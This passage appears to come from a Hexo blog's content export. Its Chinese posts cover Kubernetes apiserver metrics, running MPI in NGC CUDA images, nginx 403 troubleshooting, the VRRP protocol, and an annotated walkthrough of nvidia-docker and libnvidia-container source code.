该量保存了最后一个窗口中，正在处理的请求数量的高水位线<br>apiserver_current_inqueue_requests    gauge    是一个表向量， 记录最近排队请求数量的高水位线    apiserver请求限流<br>apiserver_flowcontrol_current_executing_requests    gauge    记录包含执行中（不在队列中等待）请求的瞬时数量    APF api的QOS APIPriorityAndFairness<br>apiserver_flowcontrol_current_inqueue_requests    gauge    记录包含排队中的（未执行）请求的瞬时数量<br>workqueue_adds_total    counter    wq 入队数<br>workqueue_retries_total    counter    wq retry数<br>workqueue_longest_running_processor_seconds    gauge    wq中最长运行时间<br>workqueue_queue_duration_seconds_sum    gauge    wq中等待延迟记录和<br>workqueue_queue_duration_seconds_count    gauge    wq中等待延迟记录数<br>workqueue_work_duration_seconds_sum    gauge    wq中处理延迟记录和<br>workqueue_work_duration_seconds_count    gauge    wq中处理延迟记录数</p>
<p><a href="https://segmentfault.com/a/1190000038888544" target="_blank" rel="noopener">https://segmentfault.com/a/1190000038888544</a></p>
]]></content>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>my first blog</title>
    <url>/2020/09/03/my-first-blog/</url>
    <content><![CDATA[<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3>]]></content>
  </entry>
  <entry>
    <title>ngc cuda11镜像运行mpi任务</title>
    <url>/2020/11/11/ngc-cuda11%E9%95%9C%E5%83%8F%E8%BF%90%E8%A1%8Cmpi%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<p>ngc官网的cuda 11镜像如果运行MPI任务，以太网使用以下命令提交训练任务，否则会出现以下错误</p>
<p> <img src="/2020/11/11/ngc-cuda11%E9%95%9C%E5%83%8F%E8%BF%90%E8%A1%8Cmpi%E4%BB%BB%E5%8A%A1/ucxerror.png" alt="avatar"><br>这是由于镜像内置了ucx 组件，需要IB的支持，如果没有IB的话，会报错，建议使用一下命令运行mpi任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mpirun --oversubscribe --allow-run-as-root -np 2 -mca pml ob1  python &#x2F;inspur&#x2F;models&#x2F;horovod&#x2F;tensorflow_mnist.py  --data_dir&#x3D;&#x2F;MNIST_data</span><br></pre></td></tr></table></figure>
<p>mpi这块积累不多，只记录这个错误了，后续深入后，再详细研究</p>
]]></content>
  </entry>
  <entry>
    <title>nginx出现403 is forbidden的4个原因</title>
    <url>/2020/09/04/nginx%E5%87%BA%E7%8E%B0403-is-forbidden%E7%9A%844%E4%B8%AA%E5%8E%9F%E5%9B%A0/</url>
    <content><![CDATA[<p>nginx缺少配置</p>
<p>缺少index.html或者index.php文件，就是配置文件中index index.html index.htm这行中的指定的文件。</p>
<p>server {<br>listen 80;<br>server_name localhost;<br>index index.php index.html;<br>root /var/www; } 如果在/ var/www下面没有index.php,index.html的时候，直接访问域名，找不到文件，会报403 forbidden。</p>
<p>权限问题</p>
<p>如果nginx没有web目录的操作权限，也会出现403错误。</p>
<p>解决办法：修改web目录的读写权限，或者是把nginx的启动用户改成目录的所属用户，重启Nginx即可解决</p>
<p>chmod -R 755 /var/www</p>
<p>Selinux</p>
<p>SELinux设置为开启状态（enabled）的原因</p>
<p>首先查看本机SELinux的开启状态，如果SELinux status参数为enabled即为开启状态</p>
<p>/usr/sbin/sestatus -v 或者使用getenforce命令检查</p>
<p>找到原因了，如何关闭 SELinux 呢</p>
<p>1、临时关闭（不用重启）</p>
<p>setenforce 0 2、修改配置文件 /etcselinux/config，将SELINUX=enforcing改为SELINUX=disabled</p>
<p>vi /etc/selinux/config</p>
<p>SELINUX=enforcing </p>
<p>SELINUX=disabled</p>
<p>文件被其他进程占用</p>
<p>确认nginx的目录是否被其他程序占用，我这里出现的问题就是这个原因，tomcat 启动后加载了该目录，nginx也加载了该目录，就会出现无权限访问的问题</p>
]]></content>
  </entry>
  <entry>
    <title>test</title>
    <url>/2020/09/14/test/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>vrrp 协议讲解</title>
    <url>/2021/09/02/vrrp-%E5%8D%8F%E8%AE%AE%E8%AE%B2%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="主要解决的问题"><a href="#主要解决的问题" class="headerlink" title="主要解决的问题"></a>主要解决的问题</h2><p>主机将发送给外部网络的报文发送给网关，由网关传递给外部网络，从而实现主机与外部网络的通信。正常的情况下，主机可以完全信赖网关的工作，但是当网关坏掉时，主机与外部的通信就会中断。要解决网络中断的问题，可以依靠再添加网关的方式解决，不过由于大多数主机只允许配置一个默认网关，此时需要网络管理员进行手工干预网络配置，才能使得主机使用新的网关进行通信；有时，人们运用动态路由协议的方法来解决网络出现故障这一问题，如运行RIP、OSPF等，或者使用IRDP。然而，这些协议由于配置过于复杂，或者安全性能不好等原因都不能满足用户的需求。</p>
<p>为了更好地解决网络中断的问题，网络开发者提出了VRRP，它既不需要改变组网情况，也不需要在主机上做任何配置，只需要在相关路由器上配置极少的几条命令，就能实现下一跳网关的备份，并且不会给主机带来任何负担。VRRP将局域网内的一组路由器划分在一起，形成一个VRRP备份组，它在功能上相当于一台虚拟路由器，使用虚拟路由器号进行标识。以下使用虚拟路由器代替VRRP备份组进行描述。</p>
<h2 id="VRRP-的技术优点"><a href="#VRRP-的技术优点" class="headerlink" title="VRRP 的技术优点"></a>VRRP 的技术优点</h2><p>VRRP是一种容错协议，它保证当主机的下一跳路由器出现故障时，由另一台路由器来代替出现故障的路由器进行工作，从而保持网络通信的连续性和可靠性。</p>
<p>VRRP具有如下优点：</p>
<ol>
<li><p>简化网络管理。在具有多播或广播能力的局域网（如以太网）中，借助VRRP能在某台设备出现故障时仍然提供高可靠的缺省链路，有效避免单一链路发生故障后网络中断的问题，而无需修改动态路由协议、路由发现协议等配置信息，也无需修改主机的默认网关配置。</p>
</li>
<li><p>适应性强。VRRP报文封装在IP报文中，支持各种上层协议。</p>
</li>
<li><p>网络开销小。VRRP只定义了一种报文——VRRP通告报文，并且只有处于Master状态的路由器可以发送VRRP报文。</p>
</li>
</ol>
<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ol>
<li><p>虚拟路由器：由一个Master路由器和多个Backup路由器组成。主机将虚拟路由器当作默认网关。</p>
</li>
<li><p>VRID：虚拟路由器的标识。有相同VRID的一组路由器构成一个虚拟路由器。</p>
</li>
<li><p>Master路由器：虚拟路由器中承担报文转发任务的路由器。</p>
</li>
<li><p>Backup路由器：Master路由器出现故障时，能够代替Master路由器工作的路由器。</p>
</li>
<li><p>虚拟IP地址：虚拟路由器的IP地址。一个虚拟路由器可以拥有一个或多个IP地址。</p>
</li>
<li><p>IP地址拥有者：接口IP地址与虚拟IP地址相同的路由器被称为IP地址拥有者。</p>
</li>
<li><p>虚拟MAC地址：一个虚拟路由器拥有一个虚拟MAC地址。虚拟MAC地址的格式为00-00-5E-00-01-{VRID}。通常情况下，虚拟路由器回应ARP请求使用的是虚拟MAC地址，只有虚拟路由器做特殊配置的时候，才回应接口的真实MAC地址。</p>
</li>
<li><p>优先级：VRRP根据优先级来确定虚拟路由器中每台路由器的地位。</p>
</li>
<li><p>非抢占方式：如果Backup路由器工作在非抢占方式下，则只要Master路由器没有出现故障，Backup路由器即使随后被配置了更高的优先级也不会成为Master路由器。</p>
</li>
<li><p>抢占方式：如果Backup路由器工作在抢占方式下，当它收到VRRP报文后，会将自己的优先级与通告报文中的优先级进行比较。如果自己的优先级比当前的Master路由器的优先级高，就会主动抢占成为Master路由器；否则，将保持Backup状态。</p>
</li>
</ol>
<h2 id="VRRP-工作过程"><a href="#VRRP-工作过程" class="headerlink" title="VRRP 工作过程"></a>VRRP 工作过程</h2><ol>
<li><p>虚拟路由器中的路由器根据优先级选举出Master。Master路由器通过发送免费ARP报文，将自己的虚拟MAC地址通知给与它连接的设备或者主机，从而承担报文转发任务；</p>
</li>
<li><p>Master路由器周期性发送VRRP报文，以公布其配置信息（优先级等）和工作状况；</p>
</li>
<li><p>如果Master路由器出现故障，虚拟路由器中的Backup路由器将根据优先级重新选举新的Master；</p>
</li>
<li><p>虚拟路由器状态切换时，Master路由器由一台设备切换为另外一台设备，新的Master路由器只是简单地发送一个携带虚拟路由器的MAC地址和虚拟IP地址信息的免费ARP报文，这样就可以更新与它连接的主机或设备中的ARP相关信息。网络中的主机感知不到Master路由器已经切换为另外一台设备。</p>
</li>
<li><p>Backup路由器的优先级高于Master路由器时，由Backup路由器的工作方式（抢占方式和非抢占方式）决定是否重新选举Master。</p>
</li>
</ol>
<h2 id="master选举"><a href="#master选举" class="headerlink" title="master选举"></a>master选举</h2><p>VRRP根据优先级来确定虚拟路由器中每台路由器的角色（Master路由器或Backup路由器）。优先级越高，则越有可能成为Master路由器。</p>
<p>初始创建的路由器工作在Backup状态，通过VRRP报文的交互获知虚拟路由器中其他成员的优先级：</p>
<ol>
<li><p>如果VRRP报文中Master路由器的优先级高于自己的优先级，则路由器保持在Backup状态；</p>
</li>
<li><p>如果VRRP报文中Master路由器的优先级低于自己的优先级，采用抢占工作方式的路由器将抢占成为Master状态，周期性地发送VRRP报文，采用非抢占工作方式的路由器仍保持Backup状态；</p>
</li>
<li><p>如果在一定时间内没有收到VRRP报文，则路由器切换为Master状态。</p>
<p>VRRP优先级的取值范围为0到255（数值越大表明优先级越高），可配置的范围是1到254，优先级0为系统保留给路由器放弃Master位置时候使用，255则是系统保留给IP地址拥有者使用。当路由器为IP地址拥有者时，其优先级始终为255。因此，当虚拟路由器内存在IP地址拥有者时，只要其工作正常，则为Master路由器。</p>
</li>
</ol>
<h2 id="master-状态通告"><a href="#master-状态通告" class="headerlink" title="master 状态通告"></a>master 状态通告</h2><p>Master路由器周期性地发送VRRP报文，在虚拟路由器中公布其配置信息（优先级等）和工作状况。Backup路由器通过接收到VRRP报文的情况来判断Master路由器是否工作正常。</p>
<p>Master路由器主动放弃Master地位（如Master路由器退出虚拟路由器）时，会发送优先级为0的VRRP报文，致使Backup路由器快速切换变成Master路由器。这个切换的时间称为Skew time，计算方式为：（256－Backup路由器的优先级）/256，单位为秒。</p>
<p>当Master路由器发生网络故障而不能发送VRRP报文的时候，Backup路由器并不能立即知道其工作状况。Backup路由器等待一段时间之后，如果还没有接收到VRRP报文，那么会认为Master路由器无法正常工作，而把自己升级为Master路由器，周期性发送VRRP报文。如果此时多个Backup路由器竞争Master路由器的位置，将通过优先级来选举Master路由器。Backup路由器默认等待的时间称为Master_Down_Interval，取值为：（3×VRRP报文的发送时间间隔）＋Skew time，单位为秒。</p>
<p>在性能不够稳定的网络中，Backup路由器可能因为网络堵塞而在Master_Down_Interval期间没有收到Master路由器的报文，而主动抢占为Master位置，如果此时原Master路由器的报文又到达了，就会出现虚拟路由器的成员频繁的进行Master抢占现象。为了缓解这种现象的发生，特制定了延迟等待定时器。它可以使得Backup路由器在等待了Master_Down_Interval后，再等待延迟等待时间。如在此期间仍然没有收到VRRP报文，则此Backup路由器才会切换为Master路由器，对外发送VRRP报文。</p>
<h2 id="协议相关"><a href="#协议相关" class="headerlink" title="协议相关"></a>协议相关</h2><p><a href="https://www.cnblogs.com/jony413/articles/2697404.html" target="_blank" rel="noopener">https://www.cnblogs.com/jony413/articles/2697404.html</a></p>
<h3 id="状态机："><a href="#状态机：" class="headerlink" title="状态机："></a>状态机：</h3><pre><code>                            +---------------+
                +---------&gt;|               |&lt;-------------+
                |          |  Initialize   |              |
                |   +------|               |----------+   |
                |   |      +---------------+          |   |
                |   |                                 |   |
                |   V                                 V   |
        +---------------+                       +---------------+
        |               |----------------------&gt;|               |
        |    Master     |                       |    Backup     |
        |               |&lt;----------------------|               |
        +---------------+                       +---------------+</code></pre>
<p>状态1， 初始化：<br>路由器启动时，如果路由器的优先级是255(最高优先级，路由器拥有路由器地址)，要发送VRRP通告信息，并发送广播ARP信息通告路由器IP地址对应的MAC地址为路由虚拟MAC，设置通告信息定时器准备定时发送VRRP通告信息，转为MASTER状态；<br>否则进入BACKUP状态，设置定时器检查定时检查是否收到MASTER的通告信息。</p>
<p>状态2， 主机：<br>主机状态下的路由器要完成如下功能：<br>设置定时通告定时器；<br>用VRRP虚拟MAC地址响应路由器IP地址的ARP请求；<br>转发目的MAC是VRRP虚拟MAC的数据包；<br>如果是虚拟路由器IP的拥有者，将接受目的地址是虚拟路由器IP的数据包，否则丢弃；<br>当收到shutdown的事件时删除定时通告定时器，发送优先权级为0的通告包，转初始化状态；<br>如果定时通告定时器超时时，发送VRRP通告信息；<br>收到VRRP通告信息时，如果优先权为0，发送VRRP通告信息；否则判断数据的优先级是否高于本机，或相等而且实际IP地址大于本地实际IP，设置定时通告定时器，复位主机超时定时器，转BACKUP状态；否则的话，丢弃该通告包；</p>
<p>状态3，备机：<br>备机状态下的路由器要实现以下功能：<br>设置主机超时定时器；<br>不能响应针对虚拟路由器IP的ARP请求信息；<br>丢弃所有目的MAC地址是虚拟路由器MAC地址的数据包；<br>不接受目的是虚拟路由器IP的所有数据包；<br>当收到shutdown的事件时删除主机超时定时器，转初始化状态；<br>主机超时定时器超时的时候，发送VRRP通告信息，广播ARP地址信息，转MASTER状态；<br>收到VRRP通告信息时，如果优先权为0，表示进入MASTER选举；否则判断数据的优先级是否高于本机，如果高的话承认MASTER有效，复位主机超时定时器；否则的话，丢弃该通告包；</p>
<h2 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h2><h3 id="主备备份VRRP"><a href="#主备备份VRRP" class="headerlink" title="主备备份VRRP"></a>主备备份VRRP</h3><p><img src="/2021/09/02/vrrp-%E5%8D%8F%E8%AE%AE%E8%AE%B2%E8%A7%A3/4.png" alt="avatar"><br>初始情况下，Device A是Master路由器并承担转发任务，Device B和Device C是Backup路由器且都处于就绪监听状态。如果Device A发生故障，则虚拟路由器内处于Backup状态的Device B和Device C路由器将根据优先级选出一个新的Master路由器，这个新Master路由器继续为网络内的主机转发数据</p>
<h3 id="Master使用BFD-NQA监视上行链路"><a href="#Master使用BFD-NQA监视上行链路" class="headerlink" title="Master使用BFD/NQA监视上行链路"></a>Master使用BFD/NQA监视上行链路</h3><p><img src="/2021/09/02/vrrp-%E5%8D%8F%E8%AE%AE%E8%AE%B2%E8%A7%A3/3.png" alt="avatar"></p>
<p>初始情况下，Device A作为Master路由器，承担转发任务；Device B为Backup路由器，处于就绪监听状态。Device A使用BFD监视上行到达Internet的链路状态。如果Device A的上行链路发生故障，Device A可以在毫秒级感知到网络变化，立即发送低优先级的VRRP报文给Device B。如果此时Device B的优先级高于报文中的优先级，那么它将在Skew Time时间之后切换为新的Master路由器，之后由这个新的Master路由器为网络内的主机转发数据。</p>
<h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p>在大规模集群场景下，需要使用vrrp 协议的keepalived的 组件运行在同一子网内，用于发送组播</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nvidia-docker 配置GPU</title>
    <url>/2020/12/21/nvidia-docker-%E9%85%8D%E7%BD%AEGPU/</url>
    <content><![CDATA[<p>docker  hook 的 doPrestart<br><a href="https://github.com/opencontainers/runtime-spec" target="_blank" rel="noopener">https://github.com/opencontainers/runtime-spec</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Prestart</span><br><span class="line">The prestart hooks MUST be called after the start operation is called but before the user-specified program command is executed. On Linux, for example, they are called after the container namespaces are created, so they provide an opportunity to customize the container (e.g. the network namespace could be specified in this hook).</span><br><span class="line">Note: prestart hooks were deprecated in favor of createRuntime, createContainer and startContainer hooks, which allow more granular hook control during the create and start phase.</span><br><span class="line">The prestart hooks&#39; path MUST resolve in the runtime namespace. The prestart hooks MUST be executed in the runtime namespace.</span><br></pre></td></tr></table></figure>
<p>Hook:<br>可以通过与外部应用程序挂钩来扩展容器的生命周期，从而扩展OCI兼容运行时的功能。用例示例包括复杂的网络配置，垃圾信息搜集等</p>
<h3 id="nvidia-container-toolkit-项目："><a href="#nvidia-container-toolkit-项目：" class="headerlink" title="nvidia-container-toolkit 项目："></a>nvidia-container-toolkit 项目：</h3><p>新版本的nvidia-docker增加了这个项目，主要是用来实现hook函数，并将GPU相关的参数传递给nvidia-container-cli 进行容器的GPU配置,具体的参数如下所示，在创建、重启容器时，都会执行这样的操作<br><font size="8"> /usr/bin/nvidia-container-cli  –load-kmods  –debug=/var/log/nvidia-container-toolkit.log  configure –ldconfig=@/sbin/ldconfig –device=all –compute –utility  –pid=78717  /var/lib/docker/overlay2/6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b/merged </font></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">func doPrestart() &#123;</span><br><span class="line">	var err error</span><br><span class="line"></span><br><span class="line">	defer exit()</span><br><span class="line">	log.SetFlags(0)</span><br><span class="line"></span><br><span class="line">	hook := getHookConfig()</span><br><span class="line">	cli := hook.NvidiaContainerCLI</span><br><span class="line">    //查询容器的配置参数</span><br><span class="line">	container := getContainerConfig(hook)</span><br><span class="line">    //获取GPU相关的配置参数</span><br><span class="line">	nvidia := container.Nvidia</span><br><span class="line">	if nvidia == nil &#123;</span><br><span class="line">		// Not a GPU container, nothing to do.</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	rootfs := getRootfsPath(container)</span><br><span class="line">    //获得nvidia-container-cli 的安装路径，使用该命令进行容器的GPU 相关配置，下面的全都是为这个cli 构造参数</span><br><span class="line">	args := []string&#123;getCLIPath(cli)&#125;</span><br><span class="line">	if cli.Root != nil &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--root=%s", *cli.Root))</span><br><span class="line">	&#125;</span><br><span class="line">	if cli.LoadKmods &#123;</span><br><span class="line">		args = append(args, "--load-kmods")</span><br><span class="line">	&#125;</span><br><span class="line">	if cli.NoPivot &#123;</span><br><span class="line">		args = append(args, "--no-pivot")</span><br><span class="line">	&#125;</span><br><span class="line">	if *debugflag &#123;</span><br><span class="line">		args = append(args, "--debug=/dev/stderr")</span><br><span class="line">	&#125; else if cli.Debug != nil &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--debug=%s", *cli.Debug))</span><br><span class="line">	&#125;</span><br><span class="line">	if cli.Ldcache != nil &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--ldcache=%s", *cli.Ldcache))</span><br><span class="line">	&#125;</span><br><span class="line">	if cli.User != nil &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--user=%s", *cli.User))</span><br><span class="line">	&#125;</span><br><span class="line">	args = append(args, "configure")</span><br><span class="line"></span><br><span class="line">	if cli.Ldconfig != nil &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--ldconfig=%s", *cli.Ldconfig))</span><br><span class="line">	&#125;</span><br><span class="line">	if cli.NoCgroups &#123;</span><br><span class="line">		args = append(args, "--no-cgroups")</span><br><span class="line">	&#125;</span><br><span class="line">    //将设置的GPU 环境变量或者挂载转变为device</span><br><span class="line">	if len(nvidia.Devices) &gt; 0 &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--device=%s", nvidia.Devices))</span><br><span class="line">	&#125;</span><br><span class="line">    //mig 配置</span><br><span class="line">	if len(nvidia.MigConfigDevices) &gt; 0 &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--mig-config=%s", nvidia.MigConfigDevices))</span><br><span class="line">	&#125;</span><br><span class="line">	if len(nvidia.MigMonitorDevices) &gt; 0 &#123;</span><br><span class="line">		args = append(args, fmt.Sprintf("--mig-monitor=%s", nvidia.MigMonitorDevices))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for _, cap := range strings.Split(nvidia.DriverCapabilities, ",") &#123;</span><br><span class="line">		if len(cap) == 0 &#123;</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line">		args = append(args, capabilityToCLI(cap))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !hook.DisableRequire &amp;&amp; !nvidia.DisableRequire &#123;</span><br><span class="line">		for _, req := range nvidia.Requirements &#123;</span><br><span class="line">			args = append(args, fmt.Sprintf("--require=%s", req))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	args = append(args, fmt.Sprintf("--pid=%s", strconv.FormatUint(uint64(container.Pid), 10)))</span><br><span class="line">	args = append(args, rootfs)</span><br><span class="line">  </span><br><span class="line">   	env := append(os.Environ(), cli.Environment...)</span><br><span class="line">	//这里的参数通常是这样的：</span><br><span class="line">	// &lt;font size=8&gt; /usr/bin/nvidia-container-cli  --load-kmods  --debug=/var/log/nvidia-container-toolkit.log  configure --ldconfig=@/sbin/ldconfig --device=all --compute --utility  --pid=78717  /var/lib/docker/overlay2/6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b/merged &lt;/font&gt;</span><br><span class="line">	err = syscall.Exec(args[0], args, env)</span><br><span class="line">	log.Panicln("exec failed:", err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从环境变量获取GPU 信息，先查询envSwarmGPU，再查询envVars，如果都未设置，则获取镜像中的设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func getDevicesFromEnvvar(env map[string]string, legacyImage bool) *string &#123;</span><br><span class="line">	&#x2F;&#x2F; Build a list of envvars to consider.</span><br><span class="line">	envVars :&#x3D; []string&#123;envNVVisibleDevices&#125;</span><br><span class="line">	if envSwarmGPU !&#x3D; nil &#123;</span><br><span class="line">		&#x2F;&#x2F; The Swarm envvar has higher precedence.</span><br><span class="line">		envVars &#x3D; append([]string&#123;*envSwarmGPU&#125;, envVars...)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Grab a reference to devices from the first envvar</span><br><span class="line">	&#x2F;&#x2F; in the list that actually exists in the environment.</span><br><span class="line">	var devices *string</span><br><span class="line">	for _, envVar :&#x3D; range envVars &#123;</span><br><span class="line">		if devs, ok :&#x3D; env[envVar]; ok &#123;</span><br><span class="line">			devices &#x3D; &amp;devs</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Environment variable unset with legacy image: default to &quot;all&quot;.</span><br><span class="line">	if devices &#x3D;&#x3D; nil &amp;&amp; legacyImage &#123;</span><br><span class="line">		all :&#x3D; &quot;all&quot;</span><br><span class="line">		return &amp;all</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Environment variable unset or empty or &quot;void&quot;: return nil</span><br><span class="line">	if devices &#x3D;&#x3D; nil || len(*devices) &#x3D;&#x3D; 0 || *devices &#x3D;&#x3D; &quot;void&quot; &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Environment variable set to &quot;none&quot;: reset to &quot;&quot;.</span><br><span class="line">	if *devices &#x3D;&#x3D; &quot;none&quot; &#123;</span><br><span class="line">		empty :&#x3D; &quot;&quot;</span><br><span class="line">		return &amp;empty</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Any other value.</span><br><span class="line">	return devices</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nvidia-contaienr-runtime-项目"><a href="#nvidia-contaienr-runtime-项目" class="headerlink" title="nvidia-contaienr-runtime 项目"></a>nvidia-contaienr-runtime 项目</h3><p>对接OCI runtime，将hook函数注入</p>
<p>该项目会将nvidia-container-toolkit中的preStart函数作为hook加入到runtime</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func addNVIDIAHook(spec *specs.Spec) error &#123;</span><br><span class="line">	path, err :&#x3D; exec.LookPath(&quot;nvidia-container-runtime-hook&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		path &#x3D; hookDefaultFilePath</span><br><span class="line">		_, err &#x3D; os.Stat(path)</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			return err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if fileLogger !&#x3D; nil &#123;</span><br><span class="line">		fileLogger.Printf(&quot;prestart hook path: %s\n&quot;, path)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	args :&#x3D; []string&#123;path&#125;</span><br><span class="line">	if spec.Hooks &#x3D;&#x3D; nil &#123;</span><br><span class="line">		spec.Hooks &#x3D; &amp;specs.Hooks&#123;&#125;</span><br><span class="line">	&#125; else if len(spec.Hooks.Prestart) !&#x3D; 0 &#123;</span><br><span class="line">		for _, hook :&#x3D; range spec.Hooks.Prestart &#123;</span><br><span class="line">			if !strings.Contains(hook.Path, &quot;nvidia-container-runtime-hook&quot;) &#123;</span><br><span class="line">				continue</span><br><span class="line">			&#125;</span><br><span class="line">			if fileLogger !&#x3D; nil &#123;</span><br><span class="line">				fileLogger.Println(&quot;existing nvidia prestart hook in OCI spec file&quot;)</span><br><span class="line">			&#125;</span><br><span class="line">			return nil</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#x2F;&#x2F;加入hook</span><br><span class="line">	spec.Hooks.Prestart &#x3D; append(spec.Hooks.Prestart, specs.Hook&#123;</span><br><span class="line">		Path: path,</span><br><span class="line">		Args: append(args, &quot;prestart&quot;),</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="项目libnvidia-container-项目"><a href="#项目libnvidia-container-项目" class="headerlink" title="项目libnvidia-container 项目"></a>项目libnvidia-container 项目</h3><p>nvidia-docker 的核心项目，用于将GPU驱动、相关的so库，容器可见的GPU 挂载到容器内，该项目中的 cli 相关的代码是用来使用封装nvidia-container-cli 客户端操作，项目libcontainer-toolkit 项目会使用这个cli工具进行配置。</p>
<p>挂载GPU驱动相关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">configure_command()&#123;</span><br><span class="line"></span><br><span class="line">	....</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;挂载驱动</span><br><span class="line">        if (nvc_driver_mount(nvc, cnt, drv) &lt; 0) &#123;</span><br><span class="line">                warnx(&quot;mount error: %s&quot;, nvc_error(nvc));</span><br><span class="line">                goto fail;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;挂载设备</span><br><span class="line">        for (size_t i &#x3D; 0; i &lt; devices.ngpus; ++i) &#123;</span><br><span class="line">                if (nvc_device_mount(nvc, cnt, devices.gpus[i]) &lt; 0) &#123;</span><br><span class="line">                        warnx(&quot;mount error: %s&quot;, nvc_error(nvc));</span><br><span class="line">                        goto fail;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		....</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int</span><br><span class="line">nvc_driver_mount(struct nvc_context *ctx, const struct nvc_container *cnt, const struct nvc_driver_info *info)</span><br><span class="line">&#123;</span><br><span class="line">        const char **mnt, **ptr, **tmp;</span><br><span class="line">        size_t nmnt;</span><br><span class="line">        int rv &#x3D; -1;</span><br><span class="line"></span><br><span class="line">        if (validate_context(ctx) &lt; 0)</span><br><span class="line">                return (-1);</span><br><span class="line">        if (validate_args(ctx, cnt !&#x3D; NULL &amp;&amp; info !&#x3D; NULL) &lt; 0)</span><br><span class="line">                return (-1);</span><br><span class="line"></span><br><span class="line">        if (ns_enter(&amp;ctx-&gt;err, cnt-&gt;mnt_ns, CLONE_NEWNS) &lt; 0)</span><br><span class="line">                return (-1);</span><br><span class="line"></span><br><span class="line">        nmnt &#x3D; 2 + info-&gt;nbins + info-&gt;nlibs + cnt-&gt;nlibs + info-&gt;nlibs32 + info-&gt;nipcs + info-&gt;ndevs;</span><br><span class="line">        mnt &#x3D; ptr &#x3D; (const char **)array_new(&amp;ctx-&gt;err, nmnt);</span><br><span class="line">        if (mnt &#x3D;&#x3D; NULL)</span><br><span class="line">                goto fail;</span><br><span class="line"></span><br><span class="line">        &#x2F;* Procfs mount *&#x2F;</span><br><span class="line">		&#x2F;&#x2F; 将proc 文件系统挂载到容器</span><br><span class="line">        if (ctx-&gt;dxcore.initialized)</span><br><span class="line">                log_warn(&quot;skipping procfs mount on WSL&quot;);</span><br><span class="line">        else if ((*ptr++ &#x3D; mount_procfs(&amp;ctx-&gt;err, ctx-&gt;cfg.root, cnt)) &#x3D;&#x3D; NULL)</span><br><span class="line">                goto fail;</span><br><span class="line"></span><br><span class="line">        &#x2F;* Application profile mount *&#x2F;</span><br><span class="line">        if (cnt-&gt;flags &amp; OPT_GRAPHICS_LIBS) &#123;</span><br><span class="line">                if (ctx-&gt;dxcore.initialized)</span><br><span class="line">                        log_warn(&quot;skipping app profile mount on WSL&quot;);</span><br><span class="line">                else if ((*ptr++ &#x3D; mount_app_profile(&amp;ctx-&gt;err, cnt)) &#x3D;&#x3D; NULL)</span><br><span class="line">                        goto fail;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* Host binary and library mounts *&#x2F;</span><br><span class="line">        if (info-&gt;bins !&#x3D; NULL &amp;&amp; info-&gt;nbins &gt; 0) &#123;</span><br><span class="line">                if ((tmp &#x3D; (const char **)mount_files(&amp;ctx-&gt;err, ctx-&gt;cfg.root, cnt, cnt-&gt;cfg.bins_dir, info-&gt;bins, info-&gt;nbins)) &#x3D;&#x3D; NULL)</span><br><span class="line">                        goto fail;</span><br><span class="line">                ptr &#x3D; array_append(ptr, tmp, array_size(tmp));</span><br><span class="line">                